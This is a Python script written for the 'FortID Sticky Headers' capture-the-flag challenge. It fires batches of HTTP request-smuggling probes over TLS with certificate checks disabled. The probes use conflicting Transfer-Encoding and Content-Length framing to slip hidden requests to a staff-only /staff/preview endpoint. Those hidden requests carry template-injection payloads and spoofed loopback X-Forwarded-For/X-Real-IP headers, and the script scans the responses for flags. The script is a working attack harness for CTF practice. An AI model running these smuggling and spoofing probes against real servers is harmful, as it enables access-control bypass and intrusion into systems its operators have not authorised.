#!/usr/bin/env python3
"""FortID Sticky Headers: distinguish v1 pipelining from framing desync;
then test nested staff requests. TLS on port 1337, stdlib only.
Read-only HTTP probes scoped to the supplied CTF instance.
"""
import argparse
import concurrent.futures
import json
import re
import socket
import ssl
import time
from collections import Counter
from pathlib import Path
from urllib.parse import urlencode

DEFAULT_HOST = 'sticky-headers-a2ed0b3a35ad.inst6.ctf.fortid.com'


def http(method, path, host, headers=(), body=b'', protocol='HTTP/1.1'):
    head = [f'{method} {path} {protocol}', f'Host: {host}']
    head.extend(f'{k}: {v}' for k, v in headers)
    return ('\r\n'.join(head) + '\r\n\r\n').encode() + body


def first(host, ver, mode):
    data = b'order=hello'
    hs = [('X-Client-Version', ver), ('Content-Type', 'application/x-www-form-urlencoded'),
          ('Connection', 'keep-alive')]
    if mode == 'cl':
        hs.append(('Content-Length', str(len(data))))
        body = data
    elif mode in ('chunked', 'composite', 'chunked-cl5', 'composite-cl5', 'composite-clfull'):
        body = b'B\r\norder=hello\r\n0\r\n\r\n'
        hs.append(('Transfer-Encoding', 'gzip, chunked' if mode.startswith('composite') else 'chunked'))
        if mode.endswith('cl5'):
            hs.append(('Content-Length', '5'))
        if mode == 'composite-clfull':
            hs.append(('Content-Length', str(len(body))))
    elif mode == 'get':
        return http('GET', '/robots.txt', host, [('X-Client-Version', ver), ('Connection', 'keep-alive')])
    else:
        raise ValueError(mode)
    return http('POST', '/order', host, hs, body)


def second(host, target, version='none', extra='none'):
    headers = [('Connection', 'keep-alive')]
    if version != 'none':
        headers.append(('X-Client-Version', version))
    if extra == 'xff':
        headers.append(('X-Forwarded-For', '127.0.0.1'))
    if extra == 'loopback':
        headers.append(('X-Real-IP', '127.0.0.1'))
    if target == 'robots':
        return http('GET', '/robots.txt', host, headers)
    if target == 'missing':
        return http('GET', '/zz-not-a-route', host, headers)
    if target == 'staff-get':
        return http('GET', '/staff/preview', host, headers)
    if target.startswith('staff-post'):
        if target == 'staff-post-empty':
            data = b''
        elif target == 'staff-post-math':
            data = urlencode({'message':'{{7*7}}'}).encode()
        elif target == 'staff-post-msg':
            data = urlencode({'message': 'hello'}).encode()
        else:
            data = urlencode({'message': '{{.}}'}).encode()
        headers += [('Content-Type', 'application/x-www-form-urlencoded'),
                    ('Content-Length', str(len(data)))]
        return http('POST', '/staff/preview', host, headers, data)
    raise ValueError(target)


def tests(host):
    cases = []
    def add(v, mode, target, vv='none', transport='joint', ext='none'):
        name = f'v{v}/{mode}/{target}/inner={vv}/{transport}/{ext}'
        cases.append((name, first(host, v, mode), second(host, target, vv, ext), transport))
    for v in ['1','2']:
        for mode in ['get','cl','chunked','composite','chunked-cl5','composite-cl5','composite-clfull']:
            for target in ['robots','missing','staff-get','staff-post-msg']:
                add(v,mode,target)
    for v in ['1','2']:
        for mode in ['cl','chunked','composite','composite-clfull']:
            for target in ['staff-post-empty','staff-post-math','staff-post-dot']:
                add(v,mode,target, '1')
                add(v,mode,target, '2')
    for mode in ['cl','chunked','composite','composite-clfull']:
        for target in ['robots','staff-get','staff-post-math']:
            add('1',mode,target,'1','split')
    # Small focused header persistence experiment after legacy v1 first request
    for vv in ['none','1','2']:
        for target in ['staff-get','staff-post-math']:
            for ext in ['none','xff','loopback']:
                add('1','composite',target,vv,'joint',ext)
    return cases


def run(host,port,case,wait):
    name,outer,inner,transport=case
    ctx=ssl.create_default_context()
    ctx.check_hostname=False
    ctx.verify_mode=ssl.CERT_NONE
    pieces=[]
    issue='ok'
    start=time.monotonic()
    try:
        with socket.create_connection((host,port),timeout=wait) as raw:
            with ctx.wrap_socket(raw,server_hostname=host) as ss:
                ss.settimeout(wait)
                if transport=='joint':
                    ss.sendall(outer+inner)
                else:
                    ss.sendall(outer)
                    # Wait briefly for the first response before sending the second
                    ss.settimeout(min(.65,wait))
                    try:pieces.append(ss.recv(50000))
                    except socket.timeout:pass
                    ss.sendall(inner)
                    ss.settimeout(wait)
                while sum(map(len,pieces)) < 150000:
                    try:x=ss.recv(16384)
                    except socket.timeout:
                        issue='idle_timeout'
                        break
                    if not x:break
                    pieces.append(x)
    except Exception as exc:
        issue=type(exc).__name__+':'+str(exc)[:100]
    response=b''.join(pieces)
    statuses=[i.decode() for i in re.findall(rb'HTTP/1\.[01] (\d{3})',response)]
    hits=[i.decode(errors='replace') for i in re.findall(rb'FortID\{[^}\r\n]{1,160}\}',response)]
    return dict(name=name,statuses=statuses,size=len(response),error=issue,seconds=round(time.monotonic()-start,2),
                flag=hits, has_robots=b'User-agent:' in response or b'User-agent:' in response,
                has_preview=b'preview' in response.lower(), raw_request=outer+inner, raw_response=response)


def main():
    p=argparse.ArgumentParser(description=__doc__)
    p.add_argument('--host',default=DEFAULT_HOST)
    p.add_argument('--port',type=int,default=1337)
    p.add_argument('--workers',type=int,default=5)
    p.add_argument('--timeout',type=float,default=2.5)
    p.add_argument('--out',default='sticky_v1_probe')
    p.add_argument('--limit',type=int,default=200)
    p.add_argument('--dry-run',action='store_true')
    a=p.parse_args()
    allcases=tests(a.host)[:a.limit]
    print('Scheduled',len(allcases),'probes to',a.host,':',a.port,flush=True)
    if a.dry_run:
        for case in allcases[:20]:print(case[0],repr(case[1][-50:]),repr(case[2][:90]))
        return
    directory=Path(a.out);directory.mkdir(parents=True,exist_ok=True)
    entries=[]
    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1,min(a.workers,8))) as pool:
        future={pool.submit(run,a.host,a.port,case,a.timeout):i for i,case in enumerate(allcases)}
        for f in concurrent.futures.as_completed(future):
            i=future[f]; r=f.result()
            req=r.pop('raw_request');resp=r.pop('raw_response')
            (directory/f'{i:03d}.request').write_bytes(req)
            (directory/f'{i:03d}.response').write_bytes(resp)
            r['index']=i
            entries.append(r)
            if len(r['statuses'])>1 or r['flag'] or i<8 or i%30==0:
                print(f"[{i:03d}] {r['name']} - {r['statuses']} {r['size']} bytes {r['error']}" + ('  FLAG '+str(r['flag']) if r['flag'] else ''),flush=True)
    entries.sort(key=lambda x:x['index'])
    (directory/'summary.json').write_text(json.dumps(entries,indent=2))
    counts=Counter((r['name'].split('/')[0],r['name'].split('/')[1],str(r['statuses'])) for r in entries)
    print('\nAggregate by version/framing/status:')
    for group,n in sorted(counts.items()):print(f'{n:3d} {group}')
    anomalous=[r for r in entries if any(code=='200' for code in r['statuses'][1:]) and 'staff' in r['name']]
    print('\nStaff 200 second responses:',len(anomalous))
    for r in anomalous:print(r['index'],r['name'],r['flag'])
    print('Saved all raw traffic + summary.json in',directory)

if __name__=='__main__':main()
